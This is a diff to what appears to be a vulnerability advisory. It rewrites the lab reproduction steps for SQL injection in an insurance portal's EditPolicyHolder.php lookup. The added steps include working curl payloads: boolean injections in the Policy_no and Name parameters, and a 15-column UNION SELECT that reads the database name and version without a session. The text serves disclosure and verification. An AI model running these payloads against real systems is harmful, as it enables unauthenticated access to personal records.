@@ -73,36 +73,71 @@ The following validation uses only synthetic data in an isolated laboratory depl
    FROM Policy_holder WHERE Policy_no = 100000001;
    ```
 
-5. Without creating a PHP session, first send a normal synthetic update request to establish the lab baseline:
+5. Confirm the normal lookup finds the synthetic row when both values match:
 
    ```bash
-   curl -sS -i \
-     -d 'Policy_no=100000001&Name=John%20Doe&Mobile_no=9000000000&Email_id=john%40test.local&City=Pune&Colony=Colony%20A&House_no=12&Pincode=411001&Nominee_name=Jane%20Doe&Nominee_relation=Spouse&Gender=MALE&Occupation=Engineer&DOB=1989-06-15&Edu_ql=B.E.&submit=1' \
-     "$BASE_URL/Agent/includes/UpdatePolicyHolder-inc.php" \
-     | rg -i '^Location:'
+   curl -sS -G "$BASE_URL/Agent/ManagePolicy/EditPolicyHolder.php" \
+     --data-urlencode 'Policy_no=100000001' \
+     --data-urlencode 'Name=John Doe' \
+     -o baseline.html
+   rg -c 'UPDATE POLICY HOLDER' baseline.html
    ```
 
-6. Without creating a PHP session, send a harmless boolean test to the local handler. Use a test-only value; do not include production data:
+   Expected baseline output: `1`.
+
+6. Without creating a PHP session, request the same row with a deliberately incorrect name. The normal lookup should not render the edit form:
 
    ```bash
-   curl -sS -i \
-     -d 'Policy_no=100000001%20OR%201=1&Name=NotTheCanary&submit=1' \
+   curl -sS -G "$BASE_URL/Agent/ManagePolicy/EditPolicyHolder.php" \
+     --data-urlencode 'Policy_no=100000001' \
+     --data-urlencode 'Name=NotTheCanary' \
+     -o wrong-name.html
+   rg -c 'UPDATE POLICY HOLDER' wrong-name.html
+   ```
+
+   Expected control output: `0`.
+
+7. Send a boolean expression in the numeric `Policy_no` context. Run this only against the local clone:
+
+   ```bash
+   curl -sS -G \
+     --data-urlencode 'Policy_no=100000001 OR 1=1' \
+     --data-urlencode 'Name=NotTheCanary' \
      "$BASE_URL/Agent/ManagePolicy/EditPolicyHolder.php" \
-     | sed -n '1,25p'
+     -o boolean-numeric.html
+   rg -c 'UPDATE POLICY HOLDER' boolean-numeric.html
    ```
 
-7. Observe that the handler continues after the unauthenticated redirect and renders or processes the synthetic record instead of terminating at the authentication guard.
-8. Repeat with a string-context boolean canary against the local copy:
+   Vulnerable result: output `1`; query-controlled input causes the synthetic row to be returned despite the wrong name.
+
+8. Repeat with a string-context boolean canary and nonexistent policy number:
 
    ```bash
-   curl -sS -i \
-     -d "Policy_no=999999999&Name=' OR '1'='1&submit=1" \
+   curl -sS -G \
+     --data-urlencode 'Policy_no=999999999' \
+     --data-urlencode "Name=x' OR '1'='1" \
      "$BASE_URL/Agent/ManagePolicy/EditPolicyHolder.php" \
-     | sed -n '1,25p'
+     -o boolean-string.html
+   rg -c 'UPDATE POLICY HOLDER' boolean-string.html
    ```
 
-9. Verify the synthetic row and confirm that no real record was touched. The expected vulnerable signal is that query-controlled input bypasses the intended record check while no authenticated agent session exists.
-10. Stop after confirming the boolean behavior. Do not use `UNION`, file-read, stacked-query, destructive, or data-extraction payloads in a public or production environment.
+   Vulnerable result: output `1`; the canary row is selected even though the supplied policy number does not exist.
+
+9. The `Name` parameter also supports a lab-only metadata canary. The query selects 15 columns, so use a matching synthetic projection and read only the local test database name/version:
+
+   ```bash
+   curl -sS -G "$BASE_URL/Agent/ManagePolicy/EditPolicyHolder.php" \
+     --data-urlencode 'Policy_no=999999999' \
+     --data-urlencode "Name=x' UNION SELECT 1,database(),version(),4,5,6,7,8,9,10,11,12,13,14,15 -- -" \
+     -o union-canary.html
+   rg -o 'name="Name"[^>]*value="[^"]*"' union-canary.html
+   ```
+
+   Vulnerable result: the rendered `Name` field reflects the local database metadata (for example, `l7`). Do not use this technique to enumerate tables or retrieve records.
+
+10. Confirm the synthetic database row was not changed by these read-only lookup tests, and stop. Do not run file-read, stacked-query, destructive, or data-extraction payloads against any public or production host.
+
+The POST-based arbitrary-record modification caused by the related missing authorization check is documented separately in TTA-2026-015. Keep the two findings distinct: this advisory tests SQL query manipulation in the edit lookup; TTA-2026-015 tests an unauthenticated update operation.
 
 
 ### Impact
